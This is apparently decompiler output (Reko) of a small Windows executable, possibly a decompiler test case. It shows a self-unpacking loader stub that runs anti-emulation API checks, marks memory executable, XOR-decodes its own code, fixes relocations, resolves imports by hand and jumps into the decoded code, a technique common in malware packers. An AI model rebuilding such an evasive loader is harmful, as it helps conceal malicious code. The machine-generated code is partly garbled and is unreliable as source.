// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	Eq_3 ebx_15 = null;
	Eq_3 ebp_21 = (struct <anonymous> *) 0x28;
	Eq_2 eax_22 = AddUsersToEncryptedFile(&globals->t403020, null);
	if (eax_22 != 0x00)
	{
		Eq_17 eax_31 = AreAllAccessesGranted(~0x00, ~0x00);
		if (eax_31 == 0x00)
			ebp_21 = eax_31 + 0x26;
		VirtualProtect(&globals->v401000, 0x3000, 0x40, fp - 0x20);
		struct Eq_40 * eax_49 = null;
		struct Eq_42 * esp_52 = fp - 0x44;
		do
		{
			if (ebx_15 == ebp_21)
				ebx_15 = null;
			eax_49[4199896] = (struct Eq_40) (ebx_15[0x00404000] ^ eax_49[4199896] ^ 0x54);
			eax_49 = eax_49 + 0x01;
			ebx_15 = (Eq_3) (ebx_15 + 0x01);
		} while (eax_49 < (struct Eq_40 *) 0x1440);
		word32 esi_80 = 0x00401358;
		struct Eq_69 * ecx_224 = &globals->t4028D8;
		uint32 dwLoc2C_223 = 0x00;
		if (true)
		{
			do
			{
				Eq_83 eax_232 = ecx_224->t0004 - 0x08 >> 0x01;
				word16 * edx_235 = (char *) &ecx_224->t0004 + 0x04;
				if (eax_232 > 0x00)
				{
					Eq_83 ebx_247 = eax_232;
					do
					{
						ui32 eax_250 = (word32) *edx_235;
						if ((eax_250 & 0xF000) == 0x3000)
						{
							struct Eq_202 * eax_261 = (eax_250 & 0x0FFF) + ecx_224->dw0000;
							eax_261->dw401358 = eax_261->dw401358 + 0xF0401358;
						}
						edx_235 = edx_235 + 0x01;
						ebx_247 = ebx_247 - 0x01;
					} while (ebx_247 != 0x00);
				}
				Eq_86 eax_239 = ecx_224->t0004;
				uint32 edx_241 = (word32) eax_239 + dwLoc2C_223;
				ecx_224 = ecx_224 + eax_239;
				dwLoc2C_223 = edx_241;
			} while (edx_241 < ~0x00);
		}
		struct Eq_74 * ebx_97 = &globals->t4020C4;
		esi_122 = esi_80;
		ebx_124 = ebx_97;
		esp_126 = esp_52;
		if (globals->dw4020D4 != 0x00)
		{
			do
			{
				word32 esi_122;
				struct Eq_74 * ebx_124;
				struct Eq_42 * esp_126;
				esp_126 = esp_126 - 0x04 + 0x18;
				esp_126->dw0000 = ebx_124->dw000C + esi_122;
				Eq_137 eax_131 = LoadLibraryA(esp_126->dw0000);
				esp_126->dw001C = (word32) eax_131;
				Eq_137 edx_132 = eax_131;
				if (eax_131 != null)
				{
					word32 ebp_154 = ebx_124->dw0000;
					if (ebp_154 == 0x00)
						ebp_154 = ebx_124->dw0010;
					word32 * ebp_159 = ebp_154 + esi_122;
					int32 eax_163 = *ebp_159;
					word32 * edi_164 = (word32) ((word32) esp_126[0x03].dw0000 + 0x0010)->dw0000 + esi_122;
					if (eax_163 != 0x00)
					{
						while (true)
						{
							Eq_220 eax_195;
							if (eax_163 < 0x00)
							{
								struct Eq_257 * esp_208 = esp_126 - 0x04;
								esp_208->t0000 = (word32) *ebp_159;
								*(esp_208 - 0x04) = (HMODULE *) edx_132;
								eax_195 = GetProcAddress(*(esp_208 - 0x04), esp_208->t0000);
								esi_122 = esp_208->dw001C;
							}
							else
							{
								LPCSTR * esp_217 = esp_126 - 0x04;
								*esp_217 = (LPCSTR *) (eax_163 + 0x02 + esi_122);
								*(esp_217 - 0x04) = (HMODULE *) edx_132;
								eax_195 = GetProcAddress(*(esp_217 - 0x04), *esp_217);
							}
							*edi_164 = (word32) eax_195;
							ebp_159 = ebp_159 + 0x01;
							esp_126 = esp_126 - 0x08;
							eax_163 = *ebp_159;
							edi_164 = edi_164 + 0x01;
							if (eax_163 == 0x00)
								break;
							edx_132 = (Eq_137) esp_126->dw001C;
						}
					}
					ebx_124 = esp_126->dw0000;
				}
				ebx_124 = ebx_124 + 0x01;
				esp_126[0x03] = (struct Eq_42) ebx_124;
			} while (ebx_124->dw0010 != 0x00);
		}
		ptr32 esp_101;
		byte SCZO_102;
		word32 ebx_103;
		word32 ebp_104;
		word32 esi_105;
		word32 edi_106;
		byte SZO_107;
		byte C_108;
		word32 eax_109;
		byte Z_110;
		word32 edx_111;
		byte cl_112;
		word32 ecx_113;
		byte CZ_114;
		byte S_115;
		globals->t401DB8();
		*(esp_101 - 0x04) = 0x00;
		ExitProcess(*(esp_101 - 0x04));
	}
	else
		return eax_22;
}

